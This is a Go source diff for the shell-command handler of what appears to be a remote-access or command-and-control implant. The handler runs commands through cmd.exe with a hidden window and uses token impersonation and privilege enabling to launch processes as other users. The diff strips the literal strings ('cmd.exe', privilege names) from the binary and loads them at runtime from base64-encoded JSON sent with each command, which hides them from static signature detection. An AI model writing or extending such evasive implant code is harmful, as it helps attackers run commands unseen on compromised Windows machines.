@@ -7,18 +7,62 @@ package main
 import (
 	"bytes"
 	"context"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os/exec"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
 )
 
+const (
+	idxWinShellCmdExe       = 1020
+	idxWinShellCmdSlashC    = 1021
+	idxWinShellCmdFmt       = 1022
+	idxWinShellPrivImperson = 1023
+	idxWinShellPrivAssign   = 1024
+	idxWinShellPrivQuota    = 1025
+	idxWinShellCmdDir       = 1026
+)
+
+var (
+	winShellTemplate   []string
+	winShellTemplateMu sync.RWMutex
+)
+
+func setWinShellTemplate(templates []string) {
+	winShellTemplateMu.Lock()
+	winShellTemplate = templates
+	winShellTemplateMu.Unlock()
+}
+
+func winShellTpl(idx int) string {
+	winShellTemplateMu.RLock()
+	defer winShellTemplateMu.RUnlock()
+	if winShellTemplate != nil && idx < len(winShellTemplate) {
+		return winShellTemplate[idx]
+	}
+	return ""
+}
+
 type ShellCommand struct{}
 
 func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
+			var tplData struct {
+				Templates []string `json:"tpl"`
+			}
+			if json.Unmarshal(decoded, &tplData) == nil && tplData.Templates != nil {
+				setWinShellTemplate(tplData.Templates)
+			}
+		}
+	}
+
 	if len(args) == 0 {
 		return CommandResult{
 			Output: "",
@@ -71,7 +115,7 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	// Special handling for dir command with paths ending in backslash
 	var commandStr string
-	if len(commandArgs) >= 2 && strings.ToLower(commandArgs[0]) == "dir" {
+	if len(commandArgs) >= 2 && strings.ToLower(commandArgs[0]) == winShellTpl(idxWinShellCmdDir) {
 		// Check if we have a path argument that ends with backslash
 		path := commandArgs[1]
 		if strings.HasSuffix(path, "\\") {
@@ -108,10 +152,10 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 // executeWithToken executes a command using the provided token
 func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder, token syscall.Token) CommandResult {
 	// Try to enable required privileges
-	EnablePrivilege("SeImpersonatePrivilege")
+	EnablePrivilege(winShellTpl(idxWinShellPrivImperson))
 
 	// Prepare command line
-	cmdLine := fmt.Sprintf("cmd.exe /c %s", commandStr)
+	cmdLine := fmt.Sprintf(winShellTpl(idxWinShellCmdFmt), commandStr)
 	cmdLineUTF16, err := syscall.UTF16PtrFromString(cmdLine)
 	if err != nil {
 		return CommandResult{
@@ -189,8 +233,8 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 
 	if ret == 0 {
 		// If CreateProcessWithTokenW fails, try CreateProcessAsUserW as fallback
-		EnablePrivilege("SeAssignPrimaryTokenPrivilege")
-		EnablePrivilege("SeIncreaseQuotaPrivilege")
+		EnablePrivilege(winShellTpl(idxWinShellPrivAssign))
+		EnablePrivilege(winShellTpl(idxWinShellPrivQuota))
 
 		ret, _, _ = procCreateProcessAsUserW.Call(
 			uintptr(token),
@@ -296,8 +340,7 @@ func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeo
 	execContext, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
 
-	// Use cmd.exe
-	cmd := exec.CommandContext(execContext, "cmd.exe", "/c", commandStr)
+	cmd := exec.CommandContext(execContext, winShellTpl(idxWinShellCmdExe), winShellTpl(idxWinShellCmdSlashC), commandStr)
 
 	// Hide the console window on Windows
 	cmd.SysProcAttr = &syscall.SysProcAttr{
